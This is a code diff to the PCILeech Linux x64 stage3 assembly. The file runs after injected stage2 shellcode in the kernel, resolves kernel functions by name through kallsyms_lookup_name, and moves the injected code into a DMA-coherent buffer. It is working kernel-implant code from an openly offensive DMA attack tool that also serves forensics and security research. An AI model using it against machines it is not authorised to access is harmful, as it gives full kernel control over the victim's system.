@@ -1,17 +1,19 @@
 ; lx64_stage3.asm : assembly to receive execution from stage2 shellcode.
 ; Compatible with Linux x64.
 ;
-; (c) Ulf Frisk, 2016, 2017
+; (c) Ulf Frisk, 2016-2024
 ; Author: Ulf Frisk, pcileech@frizk.net
 ;
 
 EXTRN stage3_c_EntryPoint:NEAR
+EXTRN stage3_c_TryMigrateEntryPoint:NEAR
 
 .CODE
 
 main PROC
 	; ----------------------------------------------------
 	; 1: SAME INITIAL BYTE SEQUENCE AS lx64_stage3_pre.asm
+	;    r15: storage for store old stack ptr (rsp)
 	; ----------------------------------------------------
 	label_main_base:	
 	JMP label_main_loop
@@ -28,19 +30,52 @@ main PROC
 	CMP rax, 0
 	JZ label_main_loop
 	; ----------------------------------------------------
-	; 2: CALL C CODE
+	; 2: SAVE STACK PTR & SET UP STACK
 	; ----------------------------------------------------
-	LEA rcx, label_main_base - 1000h ; address of data page in parameter 1
+	PUSH rbx
+	PUSH rbp
+	PUSH r11
+	PUSH r12
+	PUSH r14
 	PUSH r15
 	MOV r15, rsp
 	AND rsp, 0FFFFFFFFFFFFFFF0h
 	SUB rsp, 020h
+	; ----------------------------------------------------
+	; 3: CALL C CODE: MIGRATE FROM 'alloc_pages' TO 'dma_alloc_coherent' (IF POSSIBLE))
+	; ----------------------------------------------------	
+	LEA rcx, label_main_base - 1000h		; address of data page (KMDDATA) in parameter 1
+	CALL stage3_c_TryMigrateEntryPoint
+	WBINVD
+	TEST rax, rax
+	JZ migrate_fail_continue
+
+	; success - migrate execution to new buffer
+	LEA rdx, migrate_execute_continue
+	ADD rax, rdx
+	JMP rax
+	; execution migrated
+	migrate_execute_continue:
+	LEA rcx, label_main_base - 1000h		; address of data page (KMDDATA)
+	MOV rax, 1
+	MOV [rcx+68h], rax						; KMDDATA.ReservedKMD[2] (migrated mark)
+	migrate_fail_continue:
+	; ----------------------------------------------------
+	; 4: CALL C CODE: ENTRY POINT
+	; ----------------------------------------------------
+	LEA rcx, label_main_base - 1000h		; address of data page (KMDDATA) in parameter 1
 	CALL stage3_c_EntryPoint
+	; ----------------------------------------------------
+	; 5: RESTORE AND RETURN
+	; ----------------------------------------------------
+	error:
 	MOV rsp, r15
 	POP r15
-	; ----------------------------------------------------
-	; 3: RESTORE AND RETURN
-	; ----------------------------------------------------
+	POP r14
+	POP r12
+	POP r11
+	POP rbp
+	POP rbx
 	RET
 main ENDP
 
@@ -59,7 +94,7 @@ LookupFunctions PROC
 	PUSH r13
 	MOV r15, rcx				; address of kallsyms_lookup_name
 	MOV r14, rdx				; ptr to FNLX struct 
-	MOV r13, 17*8				; num functions * 8
+	MOV r13, 24*8				; num functions * 8
 	; ----------------------------------------------------
 	; 1: PUSH FUNCTION NAME POINTERS ON STACK
 	; ----------------------------------------------------
@@ -96,6 +131,20 @@ LookupFunctions PROC
 	LEA rax, str_set_memory_rox
 	PUSH rax
 	LEA rax, str_set_memory_rw
+	PUSH rax
+	LEA rax, str_dummy
+	PUSH rax
+	LEA rax, str_dma_free_attrs
+	PUSH rax
+	LEA rax, str_platform_device_alloc
+	PUSH rax
+	LEA rax, str_platform_device_add
+	PUSH rax
+	LEA rax, str_platform_device_put
+	PUSH rax
+	LEA rax, str_dma_alloc_attrs
+	PUSH rax
+	LEA rax, str_memset
 	PUSH rax
 	; ----------------------------------------------------
 	; 2: LOOKUP FUNCTION POINTERS BY NAME
@@ -135,6 +184,19 @@ LookupFunctions PROC
 	RET
 LookupFunctions ENDP
 
+; ----------------------------------------------------
+; clear_8k
+; clear 8192 bytes of memory
+; rdi -> starting address
+; ----------------------------------------------------
+clear_8k PROC
+	XOR rax, rax
+	MOV ecx, 1024
+	CLD
+	REP STOSQ [rdi]
+	RET
+clear_8k ENDP
+
 str_alloc_pages_current			db		'alloc_pages_current', 0
 str_set_memory_nx				db		'set_memory_nx', 0
 str_set_memory_rox				db		'set_memory_rox', 0
@@ -153,6 +215,13 @@ str_ioremap_nocache				db		'ioremap_nocache', 0
 str_ktime_get_real_ts64			db		'ktime_get_real_ts64', 0
 str_getnstimeofday64			db		'getnstimeofday64', 0
 str_alloc_pages					db		'alloc_pages', 0
+str_platform_device_alloc		db		'platform_device_alloc', 0
+str_platform_device_add			db		'platform_device_add', 0
+str_platform_device_put			db		'platform_device_put', 0
+str_dma_alloc_attrs				db		'dma_alloc_attrs', 0
+str_dma_free_attrs				db      'dma_free_attrs', 0
+str_memset						db		'memset', 0
+str_dummy						db		0
 
 ; ------------------------------------------------------------------
 ; Convert from the Windows X64 calling convention to the SystemV
